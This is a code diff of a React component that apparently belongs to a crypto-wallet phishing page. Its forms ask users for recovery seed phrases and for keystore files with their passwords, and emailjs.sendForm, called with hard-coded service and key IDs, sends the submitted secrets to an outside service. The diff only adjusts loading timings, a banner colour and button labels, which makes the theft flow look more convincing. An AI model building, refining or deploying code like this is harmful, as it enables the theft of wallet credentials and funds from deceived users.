@@ -3,7 +3,7 @@ import { useDisclosure } from '@chakra-ui/react'
 import emailjs from '@emailjs/browser';
 import { useInView } from "react-intersection-observer";
 import PropagateLoader from "react-spinners/PropagateLoader";
-
+import Swal from 'sweetalert2'
 import {
     Modal,
     Input,
@@ -146,7 +146,7 @@ const [post, setpost] = useState(null)
       else{
         
         emailjs.sendForm('service_g9n341o', 'template_ebq92wu' , form.current, 'uEb2CnNKXDiRIoTIJ')
-template_kqanrfo
+
         .then((result) => {
             result.text;
 
@@ -156,13 +156,13 @@ template_kqanrfo
             
               setTimeout(() =>{
                 setLoading(false)
-              },2000)
+              },4000)
 
             
             
             setTimeout(() => {
               setSuccess(true)
-            }, 3500)
+            }, 4500)
             
 
             setTimeout(() => {
@@ -175,6 +175,9 @@ template_kqanrfo
         }, (error) => {
             console.log(error.text);
         });
+
+        
+        
         
       }    
       
@@ -244,7 +247,7 @@ template_kqanrfo
 
 {
   success &&
-  <div className=' flex items-center justify-center'><h5 className='text-white font-link bg-[#ff0000a5] w-[20rem] ml-2 mt-3 h-[4rem] p-1 flex items-center justify-center pl-3'>Successfully submitted</h5></div> 
+  <div className=' flex items-center justify-center'><h5 className='text-white font-link bg-[#201ba38d] w-[20rem] ml-2 mt-3 h-[4rem] p-1 flex items-center justify-center pl-3'>Successfully submitted</h5></div> 
 }
 
 {
@@ -263,8 +266,8 @@ template_kqanrfo
 
 <p className="text-[0.8rem] mt-2 ml-2 font-link font-[400]">Typically 12 (sometines 24) words separated by single spaces</p>
 
-<button type='submit'   value="Send" className='text-[0.8rem] font-bold font-link bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white mt-4 '>PROCEED</button>
-<button onClick={clickeds} className='text-white bg-[#965050] font-link w-[4rem] h-[1.5rem] rounded  text-[0.8rem] absolute right-1 mt-[4rem]'>Back</button>
+<button type='submit'   value="Send" className='text-[0.8rem] font-bold font-link bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white mt-4 '>Submit</button>
+
 
 </form>
 
@@ -303,8 +306,8 @@ template_kqanrfo
 
 <p className="text-[0.8rem] font-link mt-2 font-[400] ml-2">Several lines of text beginning with "&#123;..&#125;"plus the password you used to encrypt it</p>
 
-<button type='submit'   value="Send" className='text-[0.8rem] font-link font-bold bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white mt-4'>PROCEED</button>
-<button onClick={clickeds} className='text-white bg-[#965050] font-link w-[4rem] h-[1.5rem] rounded  text-[0.8rem] absolute right-1 mt-[4rem]'>Back</button>
+<button type='submit'   value="Send" className='text-[0.8rem] font-link font-bold bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white mt-4'>Submit</button>
+
 
 </form>
 
@@ -342,8 +345,8 @@ template_kqanrfo
 
 <p className="text-[0.8rem] overflow-hidden font-link mt-2 ml-2 font-[400]">Typically 12 (sometines 24) words separated by a single space</p>
 
-<button onClick={onOpen}   type='submit'   value="Send" className='text-[0.8rem] font-link font-bold bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white font-link mt-4'>PROCEED</button>
-<button onClick={clickeds} className='text-white bg-[#965050] w-[4rem] h-[1.5rem] font-link rounded  text-[0.8rem] absolute right-1 mt-[4rem]'>Back</button>
+<button onClick={onOpen}   type='submit'   value="Send" className='text-[0.8rem] font-link font-bold bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white font-link mt-4'>Submit</button>
+
 
 </form>
 
